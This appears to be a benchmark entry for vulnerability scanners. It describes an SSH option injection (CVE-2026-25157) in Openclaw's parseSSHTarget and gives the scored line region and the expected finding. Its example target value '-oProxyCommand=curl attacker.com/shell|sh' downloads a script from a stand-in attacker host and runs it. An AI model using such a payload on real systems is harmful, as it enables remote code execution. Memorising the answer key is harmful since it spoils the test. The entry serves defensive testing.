# SB-SW-RW-002: SSH option injection via dash-prefixed target in parseSSHTarget

## Advisory
- Repo: `openclaw/openclaw`
- GHSA: `GHSA-q284-4pvr-m585`
- CVE: `CVE-2026-25157`
- Vulnerable commit: `d34ae86114c7a2726df10b4497616b32049ebcc9`
- Fix commit: `fb141460334f90ce9f8d159575cf342cd5567744`

## Scenario

Openclaw's macOS app includes an SSH remote-execution feature. The
`CommandResolver` class builds SSH command-line arguments using a target
string sourced from user defaults (`settings.target`). The target is
parsed by `parseSSHTarget` into user, host, and port components, then
the host (or user@host) is appended to the SSH argument array.

## Vulnerability

`parseSSHTarget` at line 429 accepts any string as an SSH target. It
splits on `@` and `:` to extract user, host, and port but never
validates that the resulting host component does not start with a dash.
At line 298-299 in `sshNodeCommand`, the parsed host is formatted into
`userHost` and appended directly to the SSH `args` array without a `--`
end-of-options separator.

An attacker who controls the target string (e.g. via manipulated user
defaults or a crafted configuration) can set it to a value like
`-oProxyCommand=calc` or `-oProxyCommand=curl attacker.com/shell|sh`.
Because `parseSSHTarget` does not reject this, the dash-prefixed string
is parsed as the host and later passed as a positional argument to SSH.
SSH interprets it as a flag rather than a hostname, executing the
injected ProxyCommand on the local machine.

## Source / Carrier / Sink
- Source: `settings.target` from `RemoteSettings` (user defaults)
- Carrier: `parseSSHTarget` parses the target into `SSHParsedTarget`
  without rejecting dash-prefixed hosts (lines 429-454)
- Sink: `args.append(userHost)` at line 299 in `sshNodeCommand` places
  the unvalidated host into the SSH command arguments
- Missing guard: no check that host does not start with `-`; no `--`
  separator before the positional hostname argument

## Annotated Region
- File: `apps/macos/Sources/Clawdbot/CommandResolver.swift`
- Lines: 429-454
- Why this region is the scoring target: it contains the `parseSSHTarget`
  function where the missing validation occurs. The function accepts any
  string and returns a parsed target with a potentially dash-prefixed
  host, which is the root cause of the injection. The fix adds validation
  in this function to reject hosts starting with a dash.

## Scanner Expectation
A scanner should flag `parseSSHTarget` for accepting dash-prefixed host
values that flow into SSH command arguments, enabling option injection.
The vulnerability is a command injection via argument confusion where
untrusted input becomes an SSH flag instead of a hostname.
